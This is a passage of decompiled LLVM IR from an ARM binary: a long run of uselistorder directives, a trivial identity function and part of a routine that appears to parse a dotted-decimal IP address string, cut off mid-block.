  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_15d70

dec_label_pc_15d70:                               ; preds = %dec_label_pc_15d70.loopexit, %dec_label_pc_15d4c
  %v2_15bdc64 = phi i32 [ %v5_15d64, %dec_label_pc_15d70.loopexit ], [ %v1_15d40, %dec_label_pc_15d4c ]
  %v0_15bcc60 = phi i32 [ %v2_15d68, %dec_label_pc_15d70.loopexit ], [ %v2_15d50, %dec_label_pc_15d4c ]
  %v0_15d70 = load i32, i32* %r1.global-to-local, align 4
  %v1_15d70 = add i32 %v0_15d70, 1
  store i32 %v1_15d70, i32* %r1.global-to-local, align 4
  br label %bb141

; uselistorder directives
  uselistorder i32 %v5_15d64, { 0, 2, 1 }
  uselistorder i32 %v3_15d58, { 1, 0 }
  uselistorder i32 %v2_15d50, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_15d40, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_15d20, { 1, 0 }
  uselistorder i32 %v3_15d1c, { 1, 0 }
  uselistorder i32 %v0_15d20, { 3, 2, 1, 0 }
  uselistorder i32 %v0_15d40, { 3, 2, 1, 0 }
  uselistorder i32 %v5_15cf8, { 0, 2, 1 }
  uselistorder i32 %v3_15cec, { 1, 0 }
  uselistorder i32 %v2_15ce4, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_15cd4, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_15cb4, { 1, 0 }
  uselistorder i32 %v3_15cb0, { 1, 0 }
  uselistorder i32 %v0_15cb4, { 3, 2, 1, 0 }
  uselistorder i32 %v0_15cd4, { 3, 2, 1, 0 }
  uselistorder i32 %v5_15c8c, { 0, 2, 1 }
  uselistorder i32 %v3_15c80, { 1, 0 }
  uselistorder i32 %v2_15c78, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_15c68, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_15c48, { 1, 0 }
  uselistorder i32 %v3_15c44, { 1, 0 }
  uselistorder i32 %v0_15c48, { 3, 2, 1, 0 }
  uselistorder i32 %v0_15c68, { 3, 2, 1, 0 }
  uselistorder i1 %v5_15d10, { 2, 0, 1 }
  uselistorder i32 %v0_15c28, { 1, 0 }
  uselistorder i32 %v0_15d14, { 4, 1, 0, 3, 2 }
  uselistorder i32 %v0_15c6830, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v1_15c18, { 2, 1, 0 }
  uselistorder i32 %v0_15c18, { 2, 0, 1 }
  uselistorder i32 %v2_15c10, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_15c10, { 1, 2, 0, 3 }
  uselistorder i32 %v0_15c10, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_15c6831, { 2, 1, 0 }
  uselistorder i32 %v11_15bec, { 1, 0 }
  uselistorder i32 %v7_15bec, { 1, 0 }
  uselistorder i32 %v1_15bcc, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v0_15bcc, { 1, 2, 0, 3 }
  uselistorder i32 %v2_15bd0, { 1, 0 }
  uselistorder i32 %v7_15bc4, { 0, 2, 1 }
  uselistorder i32 %v10_15bc0, { 1, 0 }
  uselistorder i32 %v9_15bb8, { 1, 0, 2 }
  uselistorder i32 %v6_15bb4, { 1, 0 }
  uselistorder i32 %v2_15bac, { 0, 2, 1, 3, 5, 6, 4, 7 }
  uselistorder i32 %v0_15bac, { 1, 2, 4, 0, 3 }
  uselistorder i32 %v7_15bbc, { 0, 3, 2, 1 }
  uselistorder i32 %v7_15ba0, { 0, 2, 1 }
  uselistorder i32 %v13_15b9c, { 1, 0 }
  uselistorder i32 %v4_15b98, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_15b98, { 2, 0, 1 }
  uselistorder i32 %v6_15ba0, { 0, 3, 2, 1 }
  uselistorder i32 %v7_15b90, { 0, 2, 1 }
  uselistorder i32 %v16_15b8c, { 1, 0 }
  uselistorder i32 %v4_15b88, { 1, 2, 0 }
  uselistorder i32 %v0_15b98.pr, { 1, 3, 0, 2 }
  uselistorder i32 %v6_15b90, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_15b7c, { 0, 3, 2, 1 }
  uselistorder i32 %v10_15b78, { 1, 0 }
  uselistorder i32 %v1_15b74, { 1, 0 }
  uselistorder i32 %v10_15b70, { 1, 0 }
  uselistorder i32 %v0_15b70, { 3, 2, 1, 0 }
  uselistorder i32 %v0_15b74, { 0, 1, 2, 3, 7, 6, 5, 4 }
  uselistorder i32 %v2_15b68, { 0, 2, 1 }
  uselistorder i32 %v2_15b5c, { 0, 2, 1, 3, 5, 4 }
  uselistorder i32 %v0_15b5c, { 1, 2, 6, 3, 0, 5, 4 }
  uselistorder i32 %v0_15b7448, { 1, 2, 0 }
  uselistorder i32 %v1_15b54, { 2, 1, 0 }
  uselistorder i32 %v1_15b4c, { 2, 3, 1, 0 }
  uselistorder i32 %v2_15b44, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v2_15b40, { 3, 4, 1, 2, 0, 5 }
  uselistorder i32 %v2_15b3c, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v1_15b3c, { 3, 4, 0, 6, 5, 1, 2 }
  uselistorder i32 %v4_15b28, { 0, 2, 1 }
  uselistorder i32 %v3_15b1c, { 1, 0 }
  uselistorder i32 %v2_15b14, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v12_15b04, { 1, 0, 3, 2 }
  uselistorder i32 %v8_15ae4, { 1, 0, 2 }
  uselistorder i32 %v5_15ae4, { 1, 0, 2 }
  uselistorder i32 %v2_15ae4, { 1, 0, 2 }
  uselistorder i32 %v3_15ae0, { 1, 0 }
  uselistorder i32 %v0_15ae4, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_15b04, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v4_15abc, { 0, 2, 1 }
  uselistorder i32 %v3_15ab0, { 1, 0 }
  uselistorder i32 %v2_15aa8, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v12_15a98, { 1, 0, 3, 2 }
  uselistorder i32 %v8_15a78, { 1, 0, 2 }
  uselistorder i32 %v5_15a78, { 1, 0, 2 }
  uselistorder i32 %v2_15a78, { 1, 0, 2 }
  uselistorder i32 %v3_15a74, { 1, 0 }
  uselistorder i32 %v0_15a78, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_15a98, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v4_15a50, { 0, 2, 1 }
  uselistorder i32 %v3_15a44, { 1, 0 }
  uselistorder i32 %v2_15a3c, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v12_15a2c, { 1, 0, 3, 2 }
  uselistorder i32 %v8_15a0c, { 1, 0, 2 }
  uselistorder i32 %v5_15a0c, { 1, 0, 2 }
  uselistorder i32 %v2_15a0c, { 1, 0, 2 }
  uselistorder i32 %v3_15a08, { 1, 0 }
  uselistorder i32 %v0_15a0c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_15a2c, { 4, 3, 2, 1, 0 }
  uselistorder i1 %v5_15ad4, { 2, 0, 1 }
  uselistorder i32 %v0_15ad8, { 4, 1, 0, 3, 2 }
  uselistorder i32 %v0_15a2c74, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v1_159dc, { 1, 0 }
  uselistorder i32 %v0_159dc, { 3, 1, 0, 2 }
  uselistorder i32 %v2_159d4, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_159d4, { 1, 2, 0, 3 }
  uselistorder i32 %v0_159d4, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_15a2c75, { 2, 1, 0 }
  uselistorder i32 %v1_159b4, { 1, 0, 2 }
  uselistorder i32 %v1_1598c, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v0_1598c, { 1, 2, 0, 3 }
  uselistorder i32 %v8_15978, { 1, 0, 2 }
  uselistorder i32 %v6_15974, { 1, 0 }
  uselistorder i32 %v2_1596c, { 0, 2, 1, 3, 5, 6, 4, 7 }
  uselistorder i32 %v0_1596c, { 1, 2, 4, 0, 3 }
  uselistorder i32 %v7_1597c, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v4_15964, { 0, 2, 1 }
  uselistorder i32 %v3_15964, { 3, 0, 1, 2 }
  uselistorder i1 %v0_15964, { 1, 0 }
  uselistorder i1 %v1_15964, { 1, 0 }
  uselistorder i32 %v3_15960, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_15958, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v4_15944, { 1, 2, 0 }
  uselistorder i32 %v12_15938, { 0, 1, 3, 2 }
  uselistorder i32 %v0_1592c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_15930, { 0, 1, 2, 3, 4, 5, 6, 7, 12, 11, 10, 9, 8 }
  uselistorder i32 %v2_15920, { 0, 2, 1 }
  uselistorder i32 %v2_15918, { 0, 2, 1, 3, 5, 4 }
  uselistorder i32 %v0_15918, { 1, 2, 6, 3, 0, 5, 4 }
  uselistorder i32 %v1_15910, { 1, 0 }
  uselistorder i32 %v1_15908, { 2, 1, 0 }
  uselistorder i32 %v2_15900, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v0_15900, { 1, 4, 0, 2, 3 }
  uselistorder i32 %v2_158f0, { 1, 0 }
  uselistorder i32 %v1_158f0, { 1, 5, 6, 3, 4, 0, 7, 9, 2, 8, 10 }
  uselistorder i32 %v0_158f0, { 1, 7, 9, 8, 6, 4, 0, 5, 11, 2, 3, 10, 12 }
  uselistorder i32* %r3.global-to-local, { 0, 9, 1, 2, 3, 10, 4, 5, 6, 11, 7, 8, 12, 13, 35, 36, 37, 38, 39, 40, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34 }
  uselistorder i32* %r2.global-to-local, { 0, 25, 1, 2, 3, 4, 5, 26, 6, 7, 8, 9, 10, 27, 11, 12, 13, 14, 15, 28, 66, 67, 69, 68, 70, 71, 16, 17, 18, 19, 21, 20, 22, 23, 24, 29, 30, 61, 31, 32, 33, 34, 35, 62, 36, 37, 38, 39, 40, 63, 41, 42, 43, 44, 45, 64, 46, 47, 49, 48, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 65 }
  uselistorder i32* %r1.global-to-local, { 1, 3, 0, 15, 2, 4, 6, 8, 5, 16, 7, 9, 11, 13, 10, 17, 12, 14, 18, 56, 19, 20, 21, 55, 58, 59, 61, 60, 62, 63, 65, 64, 66, 57, 22, 53, 23, 54, 24, 25, 26, 27, 28, 31, 29, 41, 30, 32, 35, 33, 42, 34, 36, 39, 37, 43, 38, 40, 44, 45, 46, 48, 47, 49, 50, 51, 52 }
  uselistorder i32* %r0.global-to-local, { 0, 23, 1, 2, 24, 3, 4, 25, 5, 6, 7, 8, 26, 28, 13, 29, 31, 30, 32, 33, 35, 34, 36, 27, 9, 10, 11, 12, 14, 15, 16, 18, 17, 19, 20, 21, 22 }
  uselistorder i1* %cpsr_z.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 11, 12, 41, 42, 43, 44, 45, 46, 13, 14, 3, 15, 16, 17, 18, 19, 0, 20, 1, 22, 2, 23, 21, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40 }
  uselistorder i1* %cpsr_v.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 11, 36, 37, 38, 39, 40, 41, 42, 12, 13, 3, 14, 15, 16, 0, 17, 1, 19, 2, 20, 18, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35 }
  uselistorder i1* %cpsr_n.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 11, 12, 42, 43, 44, 45, 46, 47, 48, 13, 14, 3, 15, 16, 17, 18, 19, 0, 20, 1, 22, 2, 23, 21, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41 }
  uselistorder i32 31, { 21, 22, 1, 0, 10, 12, 11, 13, 2, 15, 14, 26, 16, 6, 17, 23, 18, 24, 19, 25, 20, 7, 3, 8, 4, 5, 9 }
  uselistorder i32 -20, { 1, 0 }
  uselistorder i32 -2, { 12, 13, 11, 23, 0, 15, 1, 16, 2, 3, 10, 8, 9, 7, 6, 5, 4, 24, 25, 26, 27, 14, 22, 21, 20, 19, 18, 17 }
  uselistorder i32 65536, { 7, 6, 12, 8, 13, 9, 14, 10, 15, 11, 16, 17, 18, 22, 19, 23, 20, 24, 21, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 60, 59, 62, 61, 63, 64, 65, 66, 1, 67, 0, 2, 68, 69, 70, 71, 72, 75, 73, 74, 76, 77, 78, 82, 83, 84, 85, 79, 80, 81, 86, 89, 90, 91, 87, 88, 92, 93, 94, 95, 96, 98, 97, 99, 3, 100, 102, 103, 101, 104, 105, 107, 108, 109, 106, 110, 111, 112, 113, 114, 115, 141, 117, 116, 142, 119, 118, 120, 122, 121, 124, 123, 125, 4, 126, 128, 129, 130, 127, 131, 5, 132, 136, 137, 138, 133, 134, 135, 140, 139 }
  uselistorder i32 2147483632, { 3, 4, 5, 0, 1, 2, 6 }
  uselistorder i32* @r5, {}
  uselistorder i32 -3, { 1, 2, 0, 3, 4, 6, 5 }
  uselistorder i32 -5, { 1, 0 }
  uselistorder i32 11, { 13, 14, 15, 18, 19, 4, 1, 5, 2, 6, 3, 45, 46, 47, 48, 49, 0, 16, 7, 17, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 8, 30, 31, 32, 9, 33, 34, 35, 10, 36, 37, 38, 39, 40, 41, 42, 43, 44, 11, 50, 51, 52, 12, 53 }
  uselistorder i32 -12, { 0, 12, 13, 1, 15, 16, 2, 17, 18, 14, 11, 10, 9, 8, 7, 19, 20, 21, 3, 4, 5, 22, 6, 23, 24 }
  uselistorder i32 48, { 0, 9, 10, 7, 8, 2, 15, 3, 1, 11, 4, 12, 5, 13, 6, 14 }
  uselistorder i32 40, { 1, 9, 2, 0, 4, 23, 24, 10, 3, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 6, 25, 7, 26, 5, 27, 8, 28 }
  uselistorder i32 36, { 1, 8, 9, 6, 7, 0, 2, 3, 10, 4, 11, 5, 12 }
  uselistorder i32 -16, { 7, 8, 9, 10, 11, 12, 13, 14, 15, 6, 5, 4, 1, 16, 17, 18, 19, 20, 21, 3, 2, 0 }
  uselistorder i32 -32, { 1, 0, 2, 3 }
  uselistorder i32 24, { 0, 67, 68, 37, 38, 1, 69, 70, 34, 35, 14, 13, 81, 44, 82, 45, 60, 39, 15, 40, 16, 41, 17, 42, 43, 63, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 64, 59, 65, 61, 62, 83, 84, 85, 66, 86, 2, 71, 18, 3, 72, 19, 20, 4, 73, 21, 74, 22, 5, 23, 24, 6, 25, 7, 8, 9, 26, 10, 75, 27, 76, 77, 78, 28, 29, 11, 79, 30, 80, 31, 87, 88, 89, 90, 91, 32, 92, 12, 36, 33, 93 }
  uselistorder i32* @lr, { 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 0, 137, 138, 139, 1, 140, 141, 142, 2, 143, 144, 145, 146, 147, 148, 149, 150, 25, 26, 151, 152, 69, 70, 71, 72, 88, 89, 90, 91, 27, 28, 29, 30, 31, 92, 93, 4, 5, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 73, 74, 77, 78, 3, 81, 79, 80, 75, 76, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 63, 64, 65, 66, 67, 34, 109, 6, 7, 8, 9, 10, 11, 12, 32, 33, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 68, 110, 111, 112, 82, 83, 84, 85, 86, 87, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126 }
  uselistorder i32 16, { 27, 28, 29, 177, 30, 178, 179, 31, 180, 181, 32, 182, 183, 184, 185, 186, 187, 83, 84, 72, 73, 88, 85, 86, 87, 89, 22, 90, 91, 4, 5, 6, 7, 8, 21, 9, 10, 0, 11, 12, 45, 159, 46, 74, 33, 47, 75, 76, 160, 162, 163, 164, 23, 71, 13, 14, 20, 69, 15, 165, 16, 48, 161, 49, 79, 34, 80, 38, 37, 36, 77, 35, 78, 39, 50, 51, 52, 53, 54, 55, 81, 56, 82, 57, 58, 24, 92, 93, 94, 95, 59, 96, 97, 98, 99, 100, 101, 102, 60, 103, 104, 105, 41, 106, 40, 107, 108, 62, 109, 110, 111, 112, 113, 1, 61, 114, 115, 116, 64, 117, 118, 119, 120, 121, 2, 63, 122, 65, 123, 124, 125, 17, 126, 18, 127, 70, 19, 66, 67, 128, 129, 3, 43, 130, 42, 131, 132, 133, 134, 135, 136, 25, 137, 138, 139, 140, 142, 141, 143, 144, 145, 146, 147, 148, 149, 26, 150, 151, 152, 153, 154, 156, 155, 157, 158, 166, 167, 168, 169, 170, 68, 171, 44, 172, 173, 174, 175, 176 }
  uselistorder i32 20, { 112, 3, 113, 114, 0, 4, 115, 28, 29, 22, 23, 1, 30, 31, 32, 33, 24, 16, 25, 17, 26, 18, 27, 95, 5, 96, 6, 97, 21, 94, 34, 35, 7, 36, 37, 38, 39, 40, 41, 42, 8, 43, 44, 45, 46, 47, 48, 49, 50, 51, 9, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 10, 62, 63, 64, 65, 66, 67, 68, 69, 11, 70, 71, 72, 2, 73, 74, 75, 76, 19, 77, 78, 79, 80, 81, 82, 83, 84, 13, 85, 12, 86, 87, 88, 89, 15, 90, 14, 91, 92, 93, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 20, 111 }
  uselistorder i32 27, { 1, 0, 3, 2, 4 }
  uselistorder i32 -28, { 1, 2, 0 }
  uselistorder i32 7, { 37, 38, 40, 74, 87, 4, 41, 5, 16, 43, 17, 42, 2, 18, 75, 19, 76, 20, 77, 21, 78, 22, 79, 23, 80, 24, 81, 25, 82, 44, 26, 27, 28, 29, 30, 31, 32, 33, 34, 45, 46, 47, 6, 48, 49, 50, 51, 7, 52, 53, 54, 55, 8, 56, 9, 57, 10, 58, 59, 11, 60, 61, 12, 62, 63, 64, 65, 66, 13, 67, 68, 69, 70, 71, 14, 72, 3, 73, 0, 35, 83, 1, 36, 84, 85, 39, 15, 86 }
  uselistorder i32 -8, { 16, 17, 18, 19, 20, 21, 15, 14, 7, 13, 12, 11, 10, 22, 23, 24, 25, 8, 26, 0, 29, 9, 27, 28, 6, 1, 3, 2, 4, 5 }
  uselistorder i32* @ip, { 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 5, 6, 49, 1, 2, 0, 3, 4 }
  uselistorder i1 false, { 41, 42, 43, 78, 14, 40, 79, 80, 37, 38, 39, 81, 13, 82, 83, 0, 46, 45, 47, 44, 1, 3, 4, 49, 2, 11, 15, 50, 5, 6, 7, 48, 84, 85, 86, 10, 8, 9, 87, 53, 88, 89, 54, 90, 20, 21, 22, 23, 55, 91, 92, 71, 93, 94, 95, 60, 96, 25, 26, 61, 97, 62, 98, 56, 57, 58, 24, 99, 59, 100, 101, 70, 102, 103, 104, 105, 106, 107, 63, 64, 108, 109, 65, 110, 66, 67, 111, 68, 112, 69, 113, 51, 52, 114, 115, 116, 117, 118, 119, 27, 28, 72, 120, 121, 73, 34, 122, 74, 17, 18, 29, 19, 30, 31, 32, 12, 33, 123, 35, 75, 76, 124, 16, 77, 125, 36, 126 }
  uselistorder i32 4, { 87, 78, 79, 5, 452, 80, 453, 64, 6, 7, 81, 454, 82, 455, 456, 457, 458, 83, 459, 460, 461, 462, 84, 463, 464, 465, 466, 467, 8, 468, 469, 470, 471, 472, 85, 473, 63, 474, 475, 476, 477, 478, 479, 9, 10, 86, 480, 251, 252, 206, 207, 253, 254, 255, 481, 482, 483, 484, 485, 154, 155, 156, 65, 157, 158, 414, 416, 415, 412, 413, 365, 366, 367, 368, 417, 418, 419, 420, 402, 403, 404, 421, 422, 159, 160, 161, 162, 163, 53, 11, 12, 256, 257, 258, 259, 260, 261, 13, 14, 73, 15, 16, 74, 423, 424, 204, 17, 18, 108, 88, 425, 426, 66, 210, 109, 211, 164, 212, 369, 370, 371, 228, 229, 62, 61, 372, 213, 214, 208, 209, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 110, 231, 232, 233, 230, 75, 373, 111, 234, 89, 112, 113, 19, 374, 20, 375, 376, 21, 22, 377, 378, 55, 379, 54, 384, 114, 385, 115, 386, 116, 387, 117, 388, 118, 389, 119, 390, 120, 391, 121, 392, 122, 393, 123, 395, 124, 396, 125, 397, 398, 394, 380, 126, 381, 382, 383, 242, 165, 244, 23, 245, 246, 243, 24, 247, 56, 127, 248, 249, 328, 262, 235, 69, 68, 67, 236, 128, 25, 26, 27, 28, 29, 30, 237, 57, 238, 58, 239, 240, 241, 31, 32, 129, 90, 130, 131, 166, 250, 0, 132, 33, 263, 264, 167, 265, 266, 267, 168, 169, 134, 268, 133, 269, 91, 270, 271, 170, 272, 273, 171, 172, 274, 92, 275, 93, 276, 277, 173, 174, 278, 175, 279, 280, 176, 177, 135, 281, 94, 282, 95, 283, 284, 285, 286, 287, 136, 288, 96, 289, 290, 291, 178, 292, 293, 294, 295, 179, 180, 2, 296, 137, 297, 97, 298, 299, 300, 181, 301, 302, 182, 183, 3, 138, 303, 98, 304, 99, 305, 306, 184, 307, 308, 309, 310, 311, 185, 186, 312, 313, 140, 314, 4, 139, 315, 100, 316, 141, 317, 318, 319, 320, 321, 187, 322, 323, 324, 188, 189, 143, 325, 142, 101, 326, 102, 327, 329, 330, 331, 332, 333, 145, 334, 146, 335, 190, 336, 337, 338, 191, 192, 147, 339, 144, 340, 103, 341, 104, 342, 193, 343, 344, 34, 194, 345, 346, 35, 195, 347, 348, 36, 196, 349, 350, 37, 197, 76, 351, 352, 38, 353, 198, 354, 355, 39, 199, 356, 357, 40, 200, 358, 359, 41, 201, 360, 361, 42, 202, 362, 363, 43, 427, 364, 399, 400, 401, 405, 406, 407, 44, 408, 409, 1, 410, 203, 411, 428, 429, 107, 430, 431, 77, 432, 148, 433, 434, 435, 436, 105, 437, 149, 438, 439, 440, 106, 441, 150, 442, 45, 46, 47, 443, 444, 72, 71, 70, 445, 48, 49, 50, 151, 446, 152, 447, 51, 52, 448, 59, 449, 60, 153, 450, 451, 205 }
  uselistorder i32* @r2, { 78, 79, 26, 9, 27, 29, 28, 30, 31, 32, 33, 8, 80, 2, 81, 86, 87, 90, 82, 49, 53, 54, 57, 55, 56, 50, 51, 52, 43, 14, 15, 0, 16, 17, 1, 88, 3, 89, 6, 34, 35, 36, 10, 83, 84, 85, 4, 58, 59, 60, 7, 61, 62, 63, 5, 64, 65, 66, 67, 68, 44, 11, 12, 13, 47, 48, 45, 46, 21, 22, 40, 18, 19, 20, 23, 24, 25, 37, 38, 39, 41, 42, 69, 70, 71, 72, 73, 74, 75, 76, 77 }
  uselistorder label %dec_label_pc_15d58, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15cec, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15c80, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15c20, { 1, 0 }
  uselistorder label %.thread25, { 2, 0, 1 }
  uselistorder label %.thread121, { 1, 0 }
  uselistorder label %bb141, { 4, 5, 6, 1, 7, 0, 3, 2 }
  uselistorder label %dec_label_pc_15bac, { 1, 0 }
  uselistorder label %.thread15, { 1, 0 }
  uselistorder label %.thread13, { 1, 0 }
  uselistorder label %dec_label_pc_15b70, { 1, 0 }
  uselistorder label %dec_label_pc_15b5c, { 1, 0 }
  uselistorder label %dec_label_pc_15b1c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15ab0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15a44, { 2, 0, 1 }
  uselistorder label %dec_label_pc_159e4, { 1, 0 }
  uselistorder label %.thread11, { 2, 0, 1 }
  uselistorder label %.thread120, { 1, 0 }
  uselistorder label %.thread119, { 1, 0 }
  uselistorder label %bb131, { 4, 5, 6, 1, 7, 0, 2, 3 }
  uselistorder label %.thread117, { 1, 0 }
  uselistorder label %dec_label_pc_15958, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_15918, { 1, 0 }
}

define i32 @function_15d78(i32 %arg1) local_unnamed_addr {
dec_label_pc_15d78:
  ret i32 %arg1
}

define i32 @function_15d80() local_unnamed_addr {
dec_label_pc_15d80:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v0_15d80 = load i32, i32* @r0, align 4
  %v2_15d80 = icmp eq i32 %v0_15d80, 0
  %v3_15d84 = load i32, i32* @r4, align 4
  store i32 %v3_15d84, i32* %stack_var_-20, align 4
  %v0_15d88 = load i32, i32* @r1, align 4
  br i1 %v2_15d80, label %dec_label_pc_15e60, label %dec_label_pc_15d9c.lr.ph

dec_label_pc_15d9c:                               ; preds = %dec_label_pc_15d9c.lr.ph, %dec_label_pc_15e20
  %v1_15e20 = phi i32 [ 0, %dec_label_pc_15d9c.lr.ph ], [ %v5_15e20, %dec_label_pc_15e20 ]
  %v0_15e24 = phi i32 [ 1, %dec_label_pc_15d9c.lr.ph ], [ %v1_15e24, %dec_label_pc_15e20 ]
  %v0_15da4 = phi i32 [ %v0_15d80, %dec_label_pc_15d9c.lr.ph ], [ %v0_15da425, %dec_label_pc_15e20 ]
  %v1_15da4 = inttoptr i32 %v0_15da4 to i8*
  %v2_15da4 = load i8, i8* %v1_15da4, align 1
  %v3_15da4 = zext i8 %v2_15da4 to i32
  %v3_15da8 = mul nuw nsw i32 %v3_15da4, 2
  %v4_15da8 = add i32 %v3_15da8, %v2_15da0.pre
  %v5_15da8 = inttoptr i32 %v4_15da8 to i8*
  %v6_15da8 = load i8, i8* %v5_15da8, align 1
  %v1_15dac = and i8 %v6_15da8, 8
  %v2_15dac = icmp eq i8 %v1_15dac, 0
  br i1 %v2_15dac, label %dec_label_pc_15e60, label %dec_label_pc_15db4

dec_label_pc_15db4:                               ; preds = %dec_label_pc_15d9c
  br label %dec_label_pc_15dd4

dec_label_pc_15dbc:                               ; preds = %dec_label_pc_15dd4
  %v3_15dc0 = mul i32 %v0_15e20, 10
  %v4_15dc0 = add i32 %v3_15dd4, %v3_15dc0
  %v1_15dc4 = add i32 %v4_15dc0, -48
  %v8_15dcc = icmp sgt i32 %v1_15dc4, 255
  br i1 %v8_15dcc, label %dec_label_pc_15e60, label %dec_label_pc_15dd0

dec_label_pc_15dd0:                               ; preds = %dec_label_pc_15dbc
  %v1_15dd0 = add i32 %v0_15e10, 1
  store i32 %v1_15dd0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15dd4

dec_label_pc_15dd4:                               ; preds = %dec_label_pc_15db4, %dec_label_pc_15dd0
  %v0_15e20 = phi i32 [ 0, %dec_label_pc_15db4 ], [ %v1_15dc4, %dec_label_pc_15dd0 ]
  %v0_15e10 = phi i32 [ %v0_15da4, %dec_label_pc_15db4 ], [ %v1_15dd0, %dec_label_pc_15dd0 ]
  %v1_15dd4 = inttoptr i32 %v0_15e10 to i8*
  %v2_15dd4 = load i8, i8* %v1_15dd4, align 1
  %v3_15dd4 = zext i8 %v2_15dd4 to i32
  %v2_15dd8 = mul nuw nsw i32 %v3_15dd4, 2
  %v2_15ddc = add i32 %v2_15dd8, %v2_15da0.pre
  %v3_15de0 = inttoptr i32 %v2_15ddc to i8*
  %v4_15de0 = load i8, i8* %v3_15de0, align 1
  %v6_15de0 = zext i8 %v4_15de0 to i32
  %v1_15dec = and i32 %v6_15de0, 8
  %v2_15dec = icmp eq i32 %v1_15dec, 0
  br i1 %v2_15dec, label %dec_label_pc_15df4, label %dec_label_pc_15dbc

dec_label_pc_15df4:                               ; preds = %dec_label_pc_15dd4
  %v8_15df8 = icmp sgt i32 %v0_15e24, 3
  br i1 %v8_15df8, label %dec_label_pc_15e0c, label %dec_label_pc_15dfc

dec_label_pc_15dfc:                               ; preds = %dec_label_pc_15df4
  %v7_15dfc = icmp eq i8 %v2_15dd4, 46
  br i1 %v7_15dfc, label %dec_label_pc_15e04, label %dec_label_pc_15e60

dec_label_pc_15e04:                               ; preds = %dec_label_pc_15dfc
  %v1_15e04 = add i32 %v0_15e10, 1
  store i32 %v1_15e04, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15e20

dec_label_pc_15e0c:                               ; preds = %dec_label_pc_15df4
  %v2_15e0c = icmp eq i8 %v2_15dd4, 0
  %v1_15e10 = add i32 %v0_15e10, 1
  store i32 %v1_15e10, i32* %r0.global-to-local, align 4
  br i1 %v2_15e0c, label %dec_label_pc_15e20, label %dec_label_pc_15e18

dec_label_pc_15e18:                               ; preds = %dec_label_pc_15e0c
  %v1_15e18 = and i32 %v6_15de0, 32
  %v2_15e18 = icmp eq i32 %v1_15e18, 0
  br i1 %v2_15e18, label %dec_label_pc_15e60, label %dec_label_pc_15e20

dec_label_pc_15e20:                               ; preds = %dec_label_pc_15e18, %dec_label_pc_15e0c, %dec_label_pc_15e04
